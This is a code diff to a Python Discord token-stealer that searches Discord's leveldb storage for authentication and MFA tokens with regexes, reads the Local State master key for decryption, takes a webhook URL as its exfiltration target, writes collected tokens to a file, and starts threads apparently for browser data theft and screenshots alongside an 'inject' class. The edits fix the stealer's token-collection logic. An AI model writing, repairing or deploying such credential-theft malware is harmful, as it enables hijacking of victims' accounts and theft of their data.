@@ -64,7 +64,6 @@ path2 = roaming + '\\discord\\Local Storage\\leveldb\\'
 path3 = roaming + '\\discord\\'
 
 def gettokens(paths):
-    tokens = []
     for file_name in os.listdir(paths):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
@@ -72,7 +71,6 @@ def gettokens(paths):
             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27,}", r"mfa\.[\w-]{84}"):
                 for token in findall(regex, line):
                     all_tokens.append(token)
-    return tokens
 
 def get_master_key(path3):
     with open(f'{path3}Local State', 'r', encoding='utf-8') as f:
@@ -302,17 +300,16 @@ class inject:
 
 if __name__ == '__main__':
     webhook = sys.argv[1]
-    for platfrom, path in paths.items():
+    for name, path in paths.items():
         if not os.path.exists(path):
             continue
-        for tokens in gettokens(path):
-            print("finished")
+        else:
+            gettokens(path)
     remove_dup = [*set(all_tokens)]
-    with open(f"{temp}\\tokens.txt", "w", encoding="utf-8", errors="ignore") as f:
+    with open("tokens.txt", "w", encoding="utf-8", errors="ignore") as f:
         for shits in remove_dup:
             f.write(shits + "\n")
     threads = [browsers, ss]
-
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
         process.start()
